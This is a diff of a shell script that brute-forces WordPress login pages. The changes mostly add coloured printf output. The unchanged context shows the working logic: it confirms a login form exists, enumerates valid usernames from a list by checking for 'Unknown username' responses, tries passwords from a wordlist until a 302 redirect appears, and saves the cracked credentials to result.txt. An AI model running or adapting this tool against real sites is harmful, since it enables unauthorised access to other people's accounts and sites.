@@ -6,12 +6,16 @@
 
 check_login_form() {
 	TARGET=$1
-	echo "Check site live ..."
+	printf "${YELLOW}Check site live ..."
+	echo
 	response=$(curl -kis -X POST "$TARGET" -d "log=&pwd=" | grep "loginform" | wc -l)
-	if [ $response > 0 ]; then
-		echo "Target Ok"
+	if [ $response -gt 0 ]
+	then
+		printf "${LIGHTGREEN}Target Ok ${NC}"
+		echo
 	else
-		echo "${RED}Target not work !"
+		printf "${RED}Target didn't work !\n"
+		echo
 		exit
 	fi
 }
@@ -21,16 +25,19 @@ crack_pass() {
 	USER=$2
 	PASS_LIST=$3
 	while read p; do
-		echo "Trying pass: $p"
+		printf "Trying user ${LIGHTGREEN} $USER ${NC} with pass: ${YELLOW} $p ${NC}"
+		echo
 		response=$(curl -kis -X POST "$TARGET" -d "log=$USER&pwd=$p" | grep "302 Found" | wc -l)
 		if [ $response = 1 ]; then
-			echo "Pass Found: $p"
+			printf "${LIGHTGREEN}Pass Found: $p"
+			echo
 			PASSWORD=$p
 			break
 		fi
 	done <$PASS_LIST
 	if [ ! "$PASSWORD" ]; then
-		echo "${RED}Password not found with username: $USERCRACKED"
+		printf "${RED}Password not found with username: $USERCRACKED"
+		echo
 		exit
 	fi
 }
@@ -42,19 +49,22 @@ crack_user() {
 		echo "Trying user: $u"
 		response=$(curl -kis -X POST "$TARGET" -d "log=$u&pwd=admin" | grep "Unknown username" | wc -l)
 		if [ $response = 0 ]; then
-			echo "${GREEN}User Found: $u ${NC}"
+			printf "${LIGHTGREEN}User Found: $u ${NC}"
+			echo
 			USERCRACKED=$u
 			break
 		fi
 	done <$USER_LIST
 	if [ ! "$USERCRACKED" ]; then
-		echo "${RED}User not found"
+		printf "${RED}User not found"
+		echo
 		exit
 	fi
 }
 
 usage() {
-	echo "Usage: sh $0 http://localhost/wp-login.php user.txt pass.txt"
+	printf "Usage: ${YELLOW}sh $0 http://localhost/wp-login.php user.txt pass.txt"
+	echo
 }
 
 # Color
@@ -62,6 +72,7 @@ LIGHTRED='\033[1;31m'
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 LIGHTGREEN='\033[1;32m'
+YELLOW='\033[1;33m'
 NC='\033[0m'
 
 TARGET=$1
@@ -86,7 +97,7 @@ check_login_form $TARGET
 crack_user $TARGET $USER_LIST
 crack_pass $TARGET $USERCRACKED $PASS_LIST
 echo
-echo "${GREEN}Cracked Successfully!"
+printf "${LIGHTGREEN}Cracked Successfully! \n"
 echo "User: $USERCRACKED"
 echo "Pass: $PASSWORD"
 echo "$TARGET|$USERCRACKED|$PASSWORD" >result.txt
